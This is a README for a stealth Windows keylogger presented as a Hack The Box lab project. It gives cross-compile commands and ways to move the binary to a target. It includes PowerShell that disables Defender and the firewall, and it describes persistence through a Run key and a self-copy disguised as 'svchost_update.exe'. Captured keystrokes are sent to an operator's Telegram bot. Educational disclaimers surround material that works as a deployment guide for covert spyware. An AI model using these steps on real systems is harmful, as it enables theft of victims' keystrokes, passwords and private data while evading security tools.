# KL-STEALTH: Keylogger for HTB Labs

> ⚠️ **Educational Use Only** — This project is designed for Hack The Box labs, security research, and authorized penetration testing. Unauthorized use is illegal.

[![License](https://img.shields.io/badge/license-MIT%20(Restricted)-blue.svg)](LICENSE)
[![Platform](https://img.shields.io/badge/platform-Windows%2010%2B-lightgrey.svg)]()
[![Language](https://img.shields.io/badge/language-C%2B%2B17-orange.svg)]()

## 🎯 Purpose

This project implements a stealthy keylogger with Telegram C2 exfiltration for **Hack The Box practical challenges**. It demonstrates:

- Low-level keyboard hooking (`WH_KEYBOARD_LL`)
- Dynamic Windows API resolution
- WinHTTP-based C2 communication
- Basic persistence via Registry Run key
- Stealth techniques (hidden window, hidden file attributes)

## ⚠️ Legal & Ethical Disclaimer

```
THIS SOFTWARE IS FOR AUTHORIZED SECURITY RESEARCH AND EDUCATIONAL PURPOSES ONLY.

✅ Allowed:
- Use in Hack The Box labs you are enrolled in
- Testing on systems you own or have explicit written permission to test
- Academic research with institutional approval

❌ Prohibited:
- Deploying on systems without owner consent
- Intercepting communications you are not authorized to monitor
- Exfiltrating credentials, personal data, or intellectual property
- Any use that violates local, state, or federal computer crime laws

By using this software, you accept full legal responsibility for your actions.
```

## 📋 Prerequisites

### For Cross-Compilation (Ubuntu/Linux → Windows)
```bash
# Ubuntu 22.04 LTS
sudo apt update
sudo apt install -y mingw-w64 g++-mingw-w64-x86-64 git

# Verify installation
x86_64-w64-mingw32-g++ --version  # Should show MinGW-w64 version
```

### For Native Windows Compilation (Optional)
- MinGW-w64 installed and in PATH
- Windows 10/11 SDK (optional but recommended)
- Git for Windows

### Target Environment
- Windows 10 or 11 (64-bit)
- Internet access for Telegram C2
- User account with standard privileges (admin not required for basic functionality)

## 🛠️ Compilation

### Option A: Cross-Compile from Ubuntu (Recommended)
```bash
# Clone or navigate to project directory
cd kl-stealth

# Run the build script
chmod +x build/compile_linux.sh
./build/compile_linux.sh

# Output: src/kl.exe (Windows PE executable)
ls -lh src/kl.exe
file src/kl.exe  # Should show: PE32+ executable for MS Windows
```

### Option B: Compile Natively on Windows
```cmd
:: Open Developer Command Prompt or MinGW terminal
cd kl-stealth

:: Run the build script
build\compile_windows.bat

:: Output: src\kl.exe
dir src\kl.exe
```

### Manual Compile Command (Reference)
```bash
# Ubuntu cross-compile:
x86_64-w64-mingw32-g++ -o src/kl.exe src/kl_fixed.cpp \
  -lwinhttp -lshell32 -lole32 -lrpcrt4 -ladvapi32 \
  -mwindows -s -static-libgcc -static-libstdc++ -O2 \
  -Wno-deprecated-declarations -Wno-unused-variable

# Windows native (MinGW):
g++ -o src/kl.exe src/kl_fixed.cpp \
  -lwinhttp -lshell32 -lole32 -lrpcrt4 -ladvapi32 \
  -mwindows -s -static-libgcc -static-libstdc++ -O2
```

## 🚀 Deployment & Usage

### Step 1: Configure Telegram Credentials
Before compiling, ensure your credentials are set in `src/kl_fixed.cpp`:
```cpp
const std::string BOT_TOKEN_PLAINTEXT = "YOUR_BOT_TOKEN_HERE";  // From @BotFather
const std::string CHAT_ID_PLAINTEXT = "YOUR_CHAT_ID_HERE";      // From @userinfobot or similar
```

### Step 2: Transfer to Windows Target
```bash
# From Ubuntu, using scp (if VM has SSH):
scp src/kl.exe user@<VM_IP>:/Users/Public/

# Or use Python HTTP server:
cd src && python3 -m http.server 8000
# Then in Windows VM browser: http://<AWS_IP>:8000/kl.exe
```

### Step 3: Prepare Windows VM (Lab Environment Only)
```powershell
# Run PowerShell as Administrator:

# Disable Defender real-time scanning (LAB ONLY)
Set-MpPreference -DisableRealtimeMonitoring $true
Add-MpPreference -ExclusionPath "C:\Users\Public"

# Optional: Disable firewall for testing
Set-NetFirewallProfile -Profile Domain,Public,Private -Enabled False
```

### Step 4: Execute Once to Install
```cmd
:: In Windows VM, run the binary ONCE:
C:\Users\Public\kl.exe
```

**What happens on first run:**
1. Console window hides immediately (`-mwindows` + `ShowWindow(SW_HIDE)`)
2. Binary copies itself to `%APPDATA%\Microsoft\svchost_update.exe`
3. Adds Registry Run key: `HKCU\Software\Microsoft\Windows\CurrentVersion\Run\WindowsUpdateService`
4. Sets hidden + system attributes on the copied file
5. Launches the hidden copy and exits the original
6. Hidden copy begins keylogging and exfiltrating to Telegram

### Step 5: Verify Persistence
```powershell
# Check hidden file exists:
Get-ChildItem "$env:APPDATA\Microsoft\svchost_update.exe" -Force

# Check Registry Run key:
Get-ItemProperty "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run" | Select-Object WindowsUpdateService

# Check running process (may be hidden):
Get-Process | Where-Object {$_.ProcessName -like "*svchost_update*"}
```

### Step 6: Test Keylogging & Exfiltration
1. Open **Notepad** in the Windows VM
2. Type the exact flag from your HTB challenge (e.g., `HTB{lab_keylogger_2024}`)
3. Press Enter and wait 15-30 seconds
4. Check your **Telegram bot** on phone or desktop
5. You should see a message containing your keystrokes

### Step 7: Submit to HTB
1. Copy **only** the `HTB{...}` string from the Telegram message
2. Paste into the HTB challenge flag submission box
3. Click Submit ✅

## 🔧 Troubleshooting

| Issue | Solution |
|-------|----------|
| `x86_64-w64-mingw32-g++: command not found` | `sudo apt install mingw-w64 g++-mingw-w64-x86-64` |
| `cannot find -lwinhttp` | Ensure `g++-mingw-w64-x86-64` package is installed |
| `undefined reference to CoCreateGuid` | Add `-lole32 -lrpcrt4` to linker flags |
| Binary won't run on Windows | Ensure `-static-libgcc -static-libstdc++` was used |
| Defender deletes `kl.exe` instantly | Disable real-time protection + add exclusion (lab only) |
| Telegram receives nothing | Check: 1) Token/Chat ID correct 2) VM has internet 3) Run as current user |
| Keylogging doesn't capture keys | Run as Administrator (some Windows builds require elevation for global hooks) |
| No message after typing flag | Wait up to 60 seconds; check buffer flush threshold (120 chars) or timer (30s) |

### Debug Mode (Optional)
To enable debug logging, change this line in `src/kl_fixed.cpp`:
```cpp
constexpr bool DEBUG_LOG = true;  // Change from false to true
```
Logs will be written to `C:\Users\Public\kl_debug.log` (if the path is writable).

## 🧩 Architecture Overview

```
┌─────────────────────────────────────┐
│ kl.exe (Windows PE, -mwindows)      │
├─────────────────────────────────────┤
│ • Dynamic API resolution            │
│ • WH_KEYBOARD_LL hook               │
│ • WinHTTP C2 to Telegram            │
│ • Registry persistence              │
│ • Stealth: hidden window + file     │
└─────────────────────────────────────┘
          │
          ▼
┌─────────────────────────────────────┐
│ First Execution Flow                │
├─────────────────────────────────────┤
│ 1. Hide console window              │
│ 2. Copy self to %APPDATA%           │
│ 3. Add Registry Run key             │
│ 4. Set FILE_ATTRIBUTE_HIDDEN+SYSTEM │
│ 5. Launch hidden copy + exit        │
└─────────────────────────────────────┘
          │
          ▼
┌─────────────────────────────────────┐
│ Hidden Copy (Persistent)            │
├─────────────────────────────────────┤
│ • Install keyboard hook             │
│ • Buffer keystrokes (mutex-protected)│
│ • Flush to Telegram every:          │
│   - 120 characters OR               │
│   - 30 seconds (timer)              │
│ • Retry logic + offline queue       │
└─────────────────────────────────────┘
          │
          ▼
┌─────────────────────────────────────┐
│ Telegram Bot (C2)                   │
├─────────────────────────────────────┤
│ • Receives: /sendMessage or         │
│   /sendDocument with keystrokes     │
│ • Operator monitors via Telegram UI │
└─────────────────────────────────────┘
```

## 🔐 Security Notes

- **Credentials are plaintext in source**: For labs this is acceptable; for real engagements, use encrypted config or runtime injection.
- **No code signing**: Binary will trigger SmartScreen/Defender; use lab exclusions.
- **Basic evasion only**: This is not designed to bypass enterprise EDR; it meets HTB lab requirements.
- **Telegram dependency**: If Telegram is blocked, exfiltration fails; ensure VM has outbound HTTPS access.

## 📚 Learning Resources

- [Windows Hook Documentation](https://learn.microsoft.com/en-us/windows/win32/winmsg/about-hooks)
- [WinHTTP Tutorial](https://learn.microsoft.com/en-us/windows/win32/winhttp/about-winhttp)
- [HTB Malware Development Path](https://www.hackthebox.com/paths)
- [Telegram Bot API](https://core.telegram.org/bots/api)

## 🤝 Contributing

This project is for educational purposes. If you find bugs or have improvements for lab compatibility:

1. Fork the repository
2. Create a feature branch (`git checkout -b fix/issue-name`)
3. Commit changes (`git commit -m 'Fix: description'`)
4. Push to branch (`git push origin fix/issue-name`)
5. Open a Pull Request

## 📬 Contact

Copyright Holder: **Leonard Marcus**  
For educational inquiries[JABBER]: `the404assassin@yax.im`

---

> ℹ️ **Version**: 1.0.0  
> **Last Updated**: $(date +%Y-%m-%d)  
> **License**: MIT with Restricted Use Clause — See [LICENSE](LICENSE) for details.
```
